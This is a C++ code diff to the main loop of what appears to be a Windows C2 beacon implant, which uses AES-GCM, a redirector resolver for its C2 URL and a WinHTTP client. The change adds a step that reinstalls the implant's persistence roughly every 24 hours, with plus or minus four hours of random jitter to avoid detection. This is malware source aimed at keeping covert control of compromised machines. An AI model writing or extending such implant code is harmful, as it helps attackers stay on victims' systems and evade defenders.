@@ -4,6 +4,7 @@
 #include "../crypto/AesGcm.h"
 #include "../http/RedirectorResolver.h"
 #include "../http/WinHttpClient.h"
+#include "../persistence/Persistence.h"
 #include "Task.h"
 #include "../external/nlohmann/json.hpp"
 #include <chrono>
@@ -99,7 +100,20 @@ void Beacon::run() {
     std::vector<BYTE> beacon_key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
     crypto::AesGcm aes(beacon_key_vec);
 
+    auto lastPersistenceCheck = std::chrono::steady_clock::now();
+    std::random_device rd_p;
+    std::mt19937 gen_p(rd_p());
+    std::uniform_int_distribution<> jitter_p(-14400, 14400); // +/- 4 hours jitter
+
     while (true) {
+        // Periodic persistence re-installation (every 24h +/- 4h)
+        auto now = std::chrono::steady_clock::now();
+        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastPersistenceCheck).count();
+        if (elapsed > (24 * 3600 + jitter_p(gen_p))) {
+            persistence::ReinstallPersistence();
+            lastPersistenceCheck = now;
+        }
+
         if (c2Url_.empty()) {
             try {
                 LOG_DEBUG("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
